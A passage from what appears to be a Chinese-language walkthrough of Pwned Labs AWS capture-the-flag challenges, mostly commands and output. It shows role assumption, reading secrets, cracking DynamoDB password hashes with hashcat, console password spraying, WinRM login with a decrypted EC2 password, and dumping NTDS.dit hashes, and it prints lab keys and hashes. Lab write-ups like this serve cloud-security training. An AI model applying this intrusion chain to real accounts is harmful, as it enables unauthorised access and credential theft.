        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "secretsmanager:GetSecretValue",
                        "secretsmanager:DescribeSecret",
                        "secretsmanager:ListSecretVersionIds"
                    ],
                    "Resource": "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK"
                },
                {
                    "Sid": "VisualEditor1",
                    "Effect": "Allow",
                    "Action": "secretsmanager:ListSecrets",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2023-08-04T22:34:19+00:00"
    }
}

#即可得到临时的aksk和token
aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess --role-session-name feng  --external-id 37911 --no-cli-pager


```

重新配置aws后，得到secret的value：

```bash
aws secretsmanager list-secrets --no-cli-pager
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-admin-Bs8G8Z",
            "Name": "employee-database-admin",
            "Description": "Admin access to MySQL employee database",
            "LastChangedDate": "2023-07-13T02:15:38.909000+08:00",
            "LastAccessedDate": "2023-10-16T08:00:00+08:00",
            "Tags": [],
            "SecretVersionsToStages": {
                "41a82b5b-fb44-4ab3-8811-7ea171e9d3c1": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2023-07-13T02:14:35.740000+08:00"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-rpkQvl",
            "Name": "employee-database",
            "Description": "Access to MySQL employee database",
            "RotationEnabled": true,
            "RotationLambdaARN": "arn:aws:lambda:us-east-1:427648302155:function:SecretsManagermysql-rotation",
            "RotationRules": {
                "AutomaticallyAfterDays": 7,
                "ScheduleExpression": "cron(0 0 ? * 2 *)"
            },
            "LastRotatedDate": "2023-10-16T15:18:02.417000+08:00",
            "LastChangedDate": "2023-10-16T15:18:02.369000+08:00",
            "LastAccessedDate": "2023-10-16T08:00:00+08:00",
            "NextRotationDate": "2023-10-24T07:59:59+08:00",
            "Tags": [],
            "SecretVersionsToStages": {
                "2bb80579-4b3e-4319-8d74-3bca18a404a5": [
                    "AWSPREVIOUS"
                ],
                "388b154d-87b8-4c69-901b-9902484d22da": [
                    "AWSCURRENT",
                    "AWSPENDING"
                ]
            },
            "CreatedDate": "2023-07-13T02:15:02.970000+08:00"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4",
            "Name": "ext/cost-optimization",
            "Description": "Allow external partner to access cost optimization user and Huge Logistics resources",
            "LastChangedDate": "2023-08-07T04:10:16.392000+08:00",
            "LastAccessedDate": "2023-10-21T08:00:00+08:00",
            "Tags": [],
            "SecretVersionsToStages": {
                "f7d6ae91-5afd-4a53-93b9-92ee74d8469c": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2023-08-05T05:19:28.466000+08:00"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK",
            "Name": "billing/hl-default-payment",
            "Description": "Access to the default payment card for Huge Logistics",
            "LastChangedDate": "2023-08-05T06:33:39.872000+08:00",
            "LastAccessedDate": "2023-10-19T08:00:00+08:00",
            "Tags": [],
            "SecretVersionsToStages": {
                "f8e592ca-4d8a-4a85-b7fa-7059539192c5": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2023-08-05T06:33:39.828000+08:00"
        }
    ]
}


aws secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK --no-cli-pager
{
    "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK",
    "Name": "billing/hl-default-payment",
    "VersionId": "f8e592ca-4d8a-4a85-b7fa-7059539192c5",
    "SecretString": "{\"Card Brand\":\"VISA\",\"Card Number\":\"4180-5677-2810-4227\",\"Holder Name\":\"Michael Hayes\",\"CVV/CVV2\":\"839\",\"Card Expiry\":\"5/2026\",\"Flag\":\"68131559a7cee3e547d69046fdf425ca\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2023-08-05T06:33:39.867000+08:00"
}
```

从中得到了flag，现实意义就是可以随意得到目标公司的billing信息。

## 10.Execute and Identify Credential Abuse in AWS

存储工可以公开访问，下载下来里面的json文件

```bash
aws s3 cp s3://hl-storage-general/migration/asana-cloud-migration-backup.json ./ --no-sign-request

      "liked" : false,
      "likes" : [ ],
      "memberships" : [ ],
      "modified_at" : "2023-08-09T19:42:50.647Z",
      "name" : "Test automation account",
      "notes" : "Access key ID,\nAKIATRPHKUQK4TXINWX4\n\nSecret access key\n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",
      "num_hearts" : 0,
      "num_likes" : 0,
```

在json文件里面搜索AK，找到了一个aksk。

配置好之后进行简单的iam权限检查：

```bash
 aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDATRPHKUQK2AQGRYR46",
    "Account": "243687662613",
    "Arn": "arn:aws:iam::243687662613:user/migration-test"
}


aws dynamodb list-tables --no-cli-pager
{
    "TableNames": [
        "analytics_app_users",
        "user_order_logs"
    ]
}

aws dynamodb describe-endpoints --no-cli-pager
{
    "Endpoints": [
        {
            "Address": "dynamodb.us-east-1.amazonaws.com",
            "CachePeriodInMinutes": 1440
        }
    ]
}


aws dynamodb describe-table --table-name analytics_app_users --no-cli-pager
{
    "Table": {
        "AttributeDefinitions": [
            {
                "AttributeName": "UserID",
                "AttributeType": "S"
            }
        ],
        "TableName": "analytics_app_users",
        "KeySchema": [
            {
                "AttributeName": "UserID",
                "KeyType": "HASH"
            }
        ],
        "TableStatus": "ACTIVE",
        "CreationDateTime": "2023-08-10T04:23:16.704000+08:00",
        "ProvisionedThroughput": {
            "NumberOfDecreasesToday": 0,
            "ReadCapacityUnits": 0,
            "WriteCapacityUnits": 0
        },
        "TableSizeBytes": 7734,
        "ItemCount": 51,
        "TableArn": "arn:aws:dynamodb:us-east-1:243687662613:table/analytics_app_users",
        "TableId": "6568c0bb-bdf7-4380-877c-05b7826505ad",
        "BillingModeSummary": {
            "BillingMode": "PAY_PER_REQUEST",
            "LastUpdateToPayPerRequestDateTime": "2023-08-10T04:23:16.704000+08:00"
        },
        "TableClassSummary": {
            "TableClass": "STANDARD"
        },
        "DeletionProtectionEnabled": true
    }
}

aws dynamodb describe-table --table-name user_order_logs --no-cli-pager

An error occurred (AccessDeniedException) when calling the DescribeTable operation: User: arn:aws:iam::243687662613:user/migration-test is not authorized to perform: dynamodb:DescribeTable on resource: arn:aws:dynamodb:us-east-1:243687662613:table/user_order_logs because no identity-based policy allows the dynamodb:DescribeTable action


aws dynamodb scan --table-name analytics_app_users > output.json
```

表中存储了许多的用户名和密码hash，拿python处理一下：

```python
import json

up = []
with open("1.json") as f:
    js = json.load(f)
    items = js['Items']
    for item in items:
        #print((item))
        up.append(item['UserID']['S']+":"+item['PasswordHash']['S'])

print(up)
with open("hash.txt",'w') as f:
    for i in up:
        f.write(i+"\n")
```

拿hashcat爆破：

```bash
hashcat -m 1400 hash.txt /Users/feng/many-ctf/rockyou.txt --force --username

hashcat --show -m 1400  hash.txt --username
nwaverly:16e5730f247e371987dcf1f14ad963927b72ae37575a98e575f6134395769866:southbeach123
pmuamba:60d4e076c6339c81c8bdc4105ce52eeb4a186766ab42cc6f1e8b098cec3a9680:Tr@vis83
pkaur:c8e935a90248e1c2cfb2241b87e73780688301378aff3e672feb14b743b3150a:soccer!1
isilva:18efddc796c1307547e216cafadda4eee4cd7173d7f6db0430af5f14dd796fe6:freightliner01
rthomas:51c1ac4067ca6f2a531754a2396c3b5fd088f5312c274c12d7d2afe3b3f75452:Sparkery2*
sgarcia:39b81a17a1cef9d74897107a67421de06f4630e146c043b5dee333bf7e556c6a:travelling08
rstead:09d723dcba27c57054faa197e630226df6a40eb322bf565ff532b74bf81e2952:Abc123!!
jyoshida:19924b2d08e2816a18b865a38b9b19fba587756cf652f9943fe07f7a7cb477cf:1logistics
aramirez:223488c373a609fa579a603a61b81c7a0db798e49e0eba004c282ea77c416dc9:airfreight
adell:95825fc3bb5e0696c23215b2c5b1070708c072c7b3bdb1956e850640b4f4f25e:01summertime
nliu:008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601:Password123
vkawasaki:2c8c9030223e3192e96d960f19b0ecf9a9ba93175565cb987b28ec69b027ae86:Summer01
cchen:05aa6659dbc4d45231c447b876866c889f9ebc7863ccecc79e38b049a204e4a0:analytical
gpetersen:10dcca6ba3c4c763b5624ff94964dfd772c7447ac3fdce43a5775cefe1bfc6b7:R0ckY0u!
odas:03a311656c69e0c01aa7783aafc272601311d5fafa4c053ad5c3d17de44badcd:logistic
cjoyce:1ef68f8443b4dd8f9d0eb156d56eb31e2554db937f7a38ba73341ba342b7d8b9:shipping2
fwallman:88e7a770752bf253b970c0028d269b99470104760b39a59ccee336f5cbe40d7e:Wilco6!!!
bjohnson:835b9bc47736fcd5d2e8f521bcb01c9106f2095335dbdb803b2d1b248fb20a86:montecarlo98
```

依次放入user.txt和pass.txt，进行aws控制台的喷洒攻击：

```bash
./GoAWSConsoleSpray -a 243687662613 -u user.txt -p pass.txt
2023/10/22 13:50:40 GoAWSConsoleSpray: [18] users loaded. [18] passwords loaded. [324] potential login requests.
2023/10/22 13:50:40 Spraying User: arn:aws:iam::243687662613:user/nwaverly
2023/10/22 13:50:55 Spraying User: arn:aws:iam::243687662613:user/pmuamba
2023/10/22 13:51:09 Spraying User: arn:aws:iam::243687662613:user/pkaur
2023/10/22 13:51:24 Spraying User: arn:aws:iam::243687662613:user/isilva
2023/10/22 13:51:38 Spraying User: arn:aws:iam::243687662613:user/rthomas
2023/10/22 13:51:53 Spraying User: arn:aws:iam::243687662613:user/sgarcia
2023/10/22 13:52:07 Spraying User: arn:aws:iam::243687662613:user/rstead
2023/10/22 13:52:13 (rstead)	[+] SUCCESS:	Valid Password: Abc123!! 	MFA: false
```

MFA是多重身份验证，指要求用户输入更多信息，而不仅仅是输入密码。例如，除了密码之外，用户可能需要输入发送到其电子邮件的代码，回答一个秘密问题，或者扫描指纹。如果系统密码遭到泄露，第二种形式的身份验证有助于防止未经授权的账户访问。



登录成功后进入DynamoDB，user_order_logs表可以查看，里面有一列是flag：



![image-20231022135826734](pwnedlabs.assets/image-20231022135826734.png)

## 11.Leverage Insecure Storage and Backups for Profit

```bash
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDAWHEOTHRFTEMEHGPPY",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/contractor"
}

aws iam list-attached-user-policies --user-name contractor --no-cli-pager
{
    "AttachedPolicies": [
        {
            "PolicyName": "Policy",
            "PolicyArn": "arn:aws:iam::427648302155:policy/Policy"
        }
    ]
}

aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/Policy --no-cli-pager
{
    "Policy": {
        "PolicyName": "Policy",
        "PolicyId": "ANPAWHEOTHRFXRFIVBEXM",
        "Arn": "arn:aws:iam::427648302155:policy/Policy",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2023-07-27T17:39:55+00:00",
        "UpdateDate": "2023-07-28T14:24:22+00:00",
        "Tags": []
    }
}



aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/Policy --version-id v4 --no-cli-pager
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": "ec2:DescribeInstances",
                    "Resource": "*"
                },
                {
                    "Sid": "VisualEditor1",
                    "Effect": "Allow",
                    "Action": "ec2:GetPasswordData",
                    "Resource": "arn:aws:ec2:us-east-1:427648302155:instance/i-04cc1c2c7ec1af1b5"
                },
                {
                    "Sid": "VisualEditor2",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicyVersion",
                        "iam:GetPolicy",
                        "iam:GetUserPolicy",
                        "iam:ListAttachedUserPolicies",
                        "s3:GetBucketPolicy"
                    ],
                    "Resource": [
                        "arn:aws:iam::427648302155:user/contractor",
                        "arn:aws:iam::427648302155:policy/Policy",
                        "arn:aws:s3:::hl-it-admin"
                    ]
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2023-07-28T14:24:22+00:00"
    }
}


aws s3api get-bucket-policy --bucket hl-it-admin --no-cli-pager --output json
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::427648302155:user/contractor\"},\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::hl-it-admin/ssh_keys/ssh_keys_backup.zip\"}]}"
}




aws ec2 describe-instances --instance-ids i-04cc1c2c7ec1af1b5
#从中可以发现key-name为it-admin，ip为44.204.191.38



#如果没指定私钥，得到的是加密的。
aws ec2 get-password-data --instance-id i-04cc1c2c7ec1af1b5 --no-cli-pager
{
    "InstanceId": "i-04cc1c2c7ec1af1b5",
    "PasswordData": "s2QgAyMRT/OAjxv2F5FKSaco4lISg4kS+LTajSjr9eTHaKE0AdX0u7AaLzicaHV9Ki2Ue4OduBIxRPuwmzWHyUR/ZNgaIZIPCuh2XMDs4kUmvrJFZkU22WqpYQ16AUbJAvwVfNWew7nIpWpRLNB2WUom43vofSPPh3a6+xsDewgQmV0rZ/caDsfcIKASojoQ2tWpKxlz7vlUsyciDE1nuFfuOo5p5E27lWGrcyHzigHh3ErsSKq5lqQI7i2Fry0FSVowb+lXv8DVwjq5oSVP6ibrRPWqCsKWJadYg2engXL8c8vD2imPtc6wOa2wCx1CTV+9IyIKhJEE2yADo5B+Cw==",
    "Timestamp": "2023-07-27T22:39:26+00:00"
}

#通过前面s3里得到的私钥，可以解密得到：
aws ec2 get-password-data --priv-launch-key it-admin.pem --instance-id i-04cc1c2c7ec1af1b5 --no-cli-pager
{
    "InstanceId": "i-04cc1c2c7ec1af1b5",
    "PasswordData": "UZ$abRnO!bPj@KQk%BSEaB*IO%reJIX!",
    "Timestamp": "2023-07-27T22:39:26+00:00"
}

#拿到Administrator:UZ$abRnO!bPj@KQk%BSEaB*IO%reJIX!
```



然后就是登录，这个靶场的靶机我这边怎么扫端口都是全开。

Win-rm连不上，mac上的powershell用Enter-PSSession有垃圾bug，一个软件修了5年bug还没修好。

最后虚拟机里可以连接：

```powershell
#快速启动且winrm
winrm qc

#
winrm s winrm/config/client '@{TrustedHosts="*"}'

$password = convertto-securestring -AsPlainText -Force -String 'UZ$abRnO!bPj@KQk%BSEaB*IO%reJIX!'
$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "Administrator",$password
Enter-PSSession -ComputerName 44.204.191.38 -Credential $credential
```



进入后是一个比较受限的环境，没有dir命令，看一下可用命令：

```powershell
[44.204.191.38]: PS>Get-Command

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Clear-Host
Function        Exit-PSSession
Function        Get-Command
Function        Get-FormatData
Function        Get-Help
Function        Measure-Object
Function        Out-Default
Function        Select-Object
Cmdlet          Get-ChildItem                                      3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-Content                                        3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-Process                                        3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-Service                                        3.0.0.0    Microsoft.PowerShell.Management

```

Get-ChildItem即dir，Get-Content可以读文件。进行信息收集发现admin用户下有.aws，存在aksk：

```bash
Get-ChildItem c:\users\admin\.aws -force


    Directory: C:\users\admin\.aws


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2023/7/28     11:38             31 config
-a----        2023/7/28     11:38            119 credentials


[44.204.191.38]: PS>Get-Content c:\users\admin\.aws\credentials
[default]
aws_access_key_id = AKIAWHEOTHRFT5Q4524N
aws_secret_access_key = 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
[44.204.191.38]: PS>
```

配置好之后：

```bash
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDAWHEOTHRFWB4TQKI2X",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/it-admin"
}


#可以得到flag
aws s3 cp s3://hl-it-admin/flag.txt ./

#拿到本题flag之后再看看后续利用
aws s3 ls s3://hl-it-admin --recursive
2023-07-28 20:35:38          0 backup-2807/
2023-07-28 23:52:58   33554432 backup-2807/ad_backup/Active Directory/ntds.dit
2023-07-28 23:53:07      16384 backup-2807/ad_backup/Active Directory/ntds.jfm
2023-07-28 23:53:06      65536 backup-2807/ad_backup/registry/SECURITY
2023-07-28 23:52:58   17825792 backup-2807/ad_backup/registry/SYSTEM
2023-07-27 23:51:45         99 contractor_accessKeys.csv
2023-07-28 19:50:49          0 docs/
2023-07-28 19:51:07   10591957 docs/veeam_backup_12_agent_management_guide.pdf
2023-07-28 19:51:09    9408343 docs/veeam_backup_12_cloud_administrator_guide.pdf
2023-07-28 19:47:07         32 flag.txt
2023-07-27 23:53:06          0 installer/
2023-07-28 05:02:47 1579290624 installer/Veeam.iso
2023-07-28 01:34:24          0 ssh_keys/
2023-07-28 21:48:18      17483 ssh_keys/ssh_keys_backup.zip
```



在`contractor_accessKeys.csv`里发现了入口用户的aksk。

backup-2807文件夹下面有ntds.dit，这也对应了之前学的backup组读ntds.dit提权。

将ntds.dit和backup-2807/ad_backup/registry/SYSTEM下载下来，然后：



```bash
python3.10 secretsdump.py  -system ~/github/CTF/AWS/pwnedlabs/challenge11/SYSTEM -ntds ~/github/CTF/AWS/pwnedlabs/challenge11/ntds.dit LOCAL -outputfile out.txt
```



```bash
cat out.txt.ntds
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC04$:1003:aad3b435b51404eeaad3b435b51404ee:fc15058af730b1de899a7aa6759e894c:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb22f21bc86dfe7b0073d9f9f722ae0e:::
huge-logistics.local\leandra.joice:1232:aad3b435b51404eeaad3b435b51404ee:84cfc9ded98b57bcc517375c5911ca2c:::
huge-logistics.local\leigh.simone:1233:aad3b435b51404eeaad3b435b51404ee:ad32cc080b0aeb6531200bdaef08adb6:::
huge-logistics.local\hilliary.kim:1234:aad3b435b51404eeaad3b435b51404ee:52edd5f46cf02573d5e2392c67fa0183:::
huge-logistics.local\melanie.ashlie:1235:aad3b435b51404eeaad3b435b51404ee:58f507bbf45e920e5f3af9ea39bf8407:::
huge-logistics.local\corrie.florina:1236:aad3b435b51404eeaad3b435b51404ee:a44852a081d2a1e6e56841bc52751d5a:::
huge-logistics.local\salome.cherie:1237:aad3b435b51404eeaad3b435b51404ee:2297743345b040459e22a590f6501abc:::
huge-logistics.local\hali.lombard:1238:aad3b435b51404eeaad3b435b51404ee:4d4df769e6b9b338fabda5846cf85792:::
huge-logistics.local\malvina.noelani:1239:aad3b435b51404eeaad3b435b51404ee:b184a7a8dd3aad8e277455671a3fb557:::
huge-logistics.local\robena.catrina:1240:aad3b435b51404eeaad3b435b51404ee:3aa31f0925e42d68a13d3979a2d9d295:::
huge-logistics.local\darice.carlina:1241:aad3b435b51404eeaad3b435b51404ee:2d0c1d5f793a6a5a1e61f776bd23c614:::
huge-logistics.local\noemi.aleta:1242:aad3b435b51404eeaad3b435b51404ee:c757d7906536c9bda93a11e5c29aa3cf:::
huge-logistics.local\hilde.blair:1243:aad3b435b51404eeaad3b435b51404ee:27d8e62c058a1160d2929194f960e00d:::
huge-logistics.local\marya.dotti:1244:aad3b435b51404eeaad3b435b51404ee:1d67f2aa00b24a144621e7eadd33d5cc:::
huge-logistics.local\christabel.allison:1245:aad3b435b51404eeaad3b435b51404ee:cf8c3ea4bacf233de7fc96c83030dfa7:::
huge-logistics.local\jacynth.cordy:1246:aad3b435b51404eeaad3b435b51404ee:2d689608ffa8cf23ed13a15642398746:::
huge-logistics.local\shena.henrie:1247:aad3b435b51404eeaad3b435b51404ee:04eae6606eb9e379439a0f535917c447:::
huge-logistics.local\matti.shannah:1248:aad3b435b51404eeaad3b435b51404ee:55f7755ebd2dc76a1eb22c51d188bcd3:::
huge-logistics.local\dolores.kelila:1249:aad3b435b51404eeaad3b435b51404ee:66c66fa0a31fc3e5ed057d5efeab1dc9:::
huge-logistics.local\lisbeth.dee dee:1250:aad3b435b51404eeaad3b435b51404ee:71b858a065484cb184b57257ea38257c:::
huge-logistics.local\hester.rose:1251:aad3b435b51404eeaad3b435b51404ee:4f8bd3b71af9788577a7bbd1ceff165c:::
huge-logistics.local\guendolen.sarita:1252:aad3b435b51404eeaad3b435b51404ee:0ed62d424c12207eae37a41fed3ba5b6:::
huge-logistics.local\milli.prudence:1253:aad3b435b51404eeaad3b435b51404ee:b2df28898382d32f54c25815663373bb:::
huge-logistics.local\marley.carmel:1254:aad3b435b51404eeaad3b435b51404ee:6a05807a0897db3528a9dbb5d1dd8e0e:::
huge-logistics.local\holly-anne.jilli:1255:aad3b435b51404eeaad3b435b51404ee:820fe3909b47c6a0033fd9daa1adb5dd:::
huge-logistics.local\clara.cherlyn:1256:aad3b435b51404eeaad3b435b51404ee:ba8a94fa8d4ba394b48054110cb6f3a4:::
huge-logistics.local\patsy.janelle:1257:aad3b435b51404eeaad3b435b51404ee:23976000d1d81d14e8a9ac10b911bf01:::
huge-logistics.local\kliment.maxine:1258:aad3b435b51404eeaad3b435b51404ee:448693c8572e0366aa5d3918a6cc08c4:::
huge-logistics.local\marna.nola:1259:aad3b435b51404eeaad3b435b51404ee:cdbace0a2a02b3f2910b67a5149c3663:::
huge-logistics.local\channa.becca:1260:aad3b435b51404eeaad3b435b51404ee:33961a9261c971603045aab5025ce261:::
huge-logistics.local\ketty.carma:1261:aad3b435b51404eeaad3b435b51404ee:1674049edd3d39cead200b0fee90982a:::
huge-logistics.local\minnnie.constancy:1262:aad3b435b51404eeaad3b435b51404ee:d4d80946786dbde60c9444f418ef5bcf:::
huge-logistics.local\maisie.lucina:1263:aad3b435b51404eeaad3b435b51404ee:7c8a3738dadd4f36840198789f0478cb:::
huge-logistics.local\glad.jocelyn:1264:aad3b435b51404eeaad3b435b51404ee:38b98b15b1a51751b6476e3c81c19778:::
huge-logistics.local\ediva.jori:1265:aad3b435b51404eeaad3b435b51404ee:7ba3e8408655e32b0f8a87ac72db56b5:::
huge-logistics.local\janot.odelinda:1266:aad3b435b51404eeaad3b435b51404ee:4c2d655a8a0e8a2fea82285df4a9f012:::
huge-logistics.local\livvie.kelcey:1267:aad3b435b51404eeaad3b435b51404ee:8cafe765a32ebb1fa5b499ea81e4eca3:::
huge-logistics.local\daniele.adel:1268:aad3b435b51404eeaad3b435b51404ee:7328ddb3372d4c2e3cc95dd0658e75d9:::
huge-logistics.local\bonnee.korney:1269:aad3b435b51404eeaad3b435b51404ee:2a4a477042a48d6ffd28a48efbd423f3:::
huge-logistics.local\benetta.ileane:1270:aad3b435b51404eeaad3b435b51404ee:7920c5ef57e37afd975a5ba615315ffe:::
huge-logistics.local\ronny.henriette:1271:aad3b435b51404eeaad3b435b51404ee:93775a28ba9b79ac6f8ccefee6e50bfa:::
huge-logistics.local\heda.lorin:1272:aad3b435b51404eeaad3b435b51404ee:83e39714b361119459d171eb37abce8b:::
huge-logistics.local\kathie.lanae:1273:aad3b435b51404eeaad3b435b51404ee:98e7199737a9dcb3e7976605301fc78c:::
huge-logistics.local\leila.flori:1274:aad3b435b51404eeaad3b435b51404ee:d97f2468bac33f8b81c218c8bd4ebf3b:::
huge-logistics.local\sharleen.liam:1275:aad3b435b51404eeaad3b435b51404ee:6da61d11cc174b4bfe24139888c6295b:::
huge-logistics.local\nikki.carmen:1276:aad3b435b51404eeaad3b435b51404ee:4a847bb71cf2a13d64e6f907612c2e19:::
huge-logistics.local\dusty.renae:1277:aad3b435b51404eeaad3b435b51404ee:526c604cdb5d4dec8f53870d4b28bd43:::
huge-logistics.local\lanette.kiele:1278:aad3b435b51404eeaad3b435b51404ee:89492d216d0a212f8ed54fc5ac9d340b:::
huge-logistics.local\sula.briny:1279:aad3b435b51404eeaad3b435b51404ee:382595db51435056829f89d32f07afda:::
huge-logistics.local\dorene.nikaniki:1280:aad3b435b51404eeaad3b435b51404ee:517a0589b03fbcf6e760cfceac3a7e7e:::
huge-logistics.local\bill.ertha:1281:aad3b435b51404eeaad3b435b51404ee:940e604030ee577e4aadd2455be51faf:::
huge-logistics.local\marge.fulvia:1282:aad3b435b51404eeaad3b435b51404ee:1b1519f52cff58292a29b7f1b0ce2c5c:::
huge-logistics.local\ardyth.ronni:1283:aad3b435b51404eeaad3b435b51404ee:b73835d6b41c34f4034872dcbca7fd8f:::
huge-logistics.local\cristina.caresa:1284:aad3b435b51404eeaad3b435b51404ee:bafb36e134115cd5cff8c9921d952d1f:::
huge-logistics.local\patrica.donielle:1285:aad3b435b51404eeaad3b435b51404ee:5e76c56945d6852c6bd94584be2919b4:::
huge-logistics.local\rodie.gillan:1286:aad3b435b51404eeaad3b435b51404ee:9d97decdd8afe67f3ca148aeb86623ee:::
huge-logistics.local\faydra.susette:1287:aad3b435b51404eeaad3b435b51404ee:ee5b08f240f9a2276dbff3d3e4d802c4:::
huge-logistics.local\cass.lazarus:1288:aad3b435b51404eeaad3b435b51404ee:1a82b53970340f220fa8e72ec5c4f0f5:::
huge-logistics.local\desdemona.lazar:1289:aad3b435b51404eeaad3b435b51404ee:4438ad9cf926bd562f33cd7225b4e59f:::
huge-logistics.local\anabel.brandise:1290:aad3b435b51404eeaad3b435b51404ee:ebd88f0eb942f0a51c824675fedd2bc3:::
huge-logistics.local\faythe.marj:1291:aad3b435b51404eeaad3b435b51404ee:2f85340d220475c10d41221f9c3cd2fc:::
huge-logistics.local\jackie.heddi:1292:aad3b435b51404eeaad3b435b51404ee:39c94f4ed06f078457432b63ce041a10:::
huge-logistics.local\caryl.janeen:1293:aad3b435b51404eeaad3b435b51404ee:1aae6436a7ea6825886b9faf5b374d81:::
huge-logistics.local\courtenay.charil:1294:aad3b435b51404eeaad3b435b51404ee:99f9b9d49ae645e2e55aac47e60dcaf8:::
huge-logistics.local\konrad.deeanne:1295:aad3b435b51404eeaad3b435b51404ee:183fdb5d57e5b5ce6e6a407d48c06501:::
huge-logistics.local\adele.jillayne:1296:aad3b435b51404eeaad3b435b51404ee:ac963d9498d6634563747a15b590f345:::
huge-logistics.local\astrix.ricki:1297:aad3b435b51404eeaad3b435b51404ee:c06fac7b16ff2882ec6a6aa607c5ad46:::
huge-logistics.local\gerti.bryn:1298:aad3b435b51404eeaad3b435b51404ee:962a4de38382335fc9079333a34a1e2d:::
huge-logistics.local\georgette.dido:1299:aad3b435b51404eeaad3b435b51404ee:94a3e23a4913eb9fa922c6d5d042cc5a:::
huge-logistics.local\debbie.cindee:1300:aad3b435b51404eeaad3b435b51404ee:69ae64fa4e77fe2f94acf432d4808ed3:::
huge-logistics.local\chandal.leslie:1301:aad3b435b51404eeaad3b435b51404ee:d110d234c2d69671d046de65f3cdad1e:::
huge-logistics.local\aleece.ceciley:1302:aad3b435b51404eeaad3b435b51404ee:424c25db5e020dd15266389235b532d7:::
huge-logistics.local\leela.francoise:1303:aad3b435b51404eeaad3b435b51404ee:313fdcc9b4ded5d9aa885bb097cec56a:::
huge-logistics.local\margie.daffie:1304:aad3b435b51404eeaad3b435b51404ee:9bf07ba25d4c32d112682873f24aee1a:::
huge-logistics.local\katerina.lotte:1305:aad3b435b51404eeaad3b435b51404ee:e418e06f112526d14237d4a7207b3a90:::
huge-logistics.local\abbey.jackie:1306:aad3b435b51404eeaad3b435b51404ee:7a6970c38963fca0d6e893e2ac00d55d:::
huge-logistics.local\kym.farand:1307:aad3b435b51404eeaad3b435b51404ee:4450e5d4b55adb0088122779cdf9b512:::
huge-logistics.local\ertha.fernanda:1308:aad3b435b51404eeaad3b435b51404ee:448693c8572e0366aa5d3918a6cc08c4:::
huge-logistics.local\jaclin.dela:1309:aad3b435b51404eeaad3b435b51404ee:77e2958b188ec6697c96487f0e6ead8d:::
huge-logistics.local\farrah.kerrin:1310:aad3b435b51404eeaad3b435b51404ee:e8e81ee6916cbc4a0b8a221d43343fab:::
huge-logistics.local\evvy.aeriell:1311:aad3b435b51404eeaad3b435b51404ee:296fc68b65f08c3bd5663ff6af2124fd:::
huge-logistics.local\kassie.clarissa:1312:aad3b435b51404eeaad3b435b51404ee:ecd2ee5c9b85adcf3fe01671f42127f6:::
huge-logistics.local\lorene.nata:1313:aad3b435b51404eeaad3b435b51404ee:fb9198bc627d07697271bc4cc49d7b83:::
huge-logistics.local\otha.nichol:1314:aad3b435b51404eeaad3b435b51404ee:2be96634178ca947e6655178e4ab15fa:::
huge-logistics.local\hallie.aimil:1315:aad3b435b51404eeaad3b435b51404ee:eb222b0fb4bec76921c771e299849ccc:::
huge-logistics.local\dorita.harli:1316:aad3b435b51404eeaad3b435b51404ee:6a712a028eba9ad62bda2b7421a5008d:::
huge-logistics.local\kailey.izabel:1317:aad3b435b51404eeaad3b435b51404ee:56ed08c5ec63f2a69d32740646cca38c:::
huge-logistics.local\beth.daveen:1318:aad3b435b51404eeaad3b435b51404ee:98ffc7d64a05bfb33c1fd4dd9430951a:::
huge-logistics.local\elvera.angelia:1319:aad3b435b51404eeaad3b435b51404ee:060658db9fc943e938f28eb675a4765a:::
huge-logistics.local\con.constantia:1320:aad3b435b51404eeaad3b435b51404ee:7c2c4fa6a5a53815a9a1a726966018ec:::
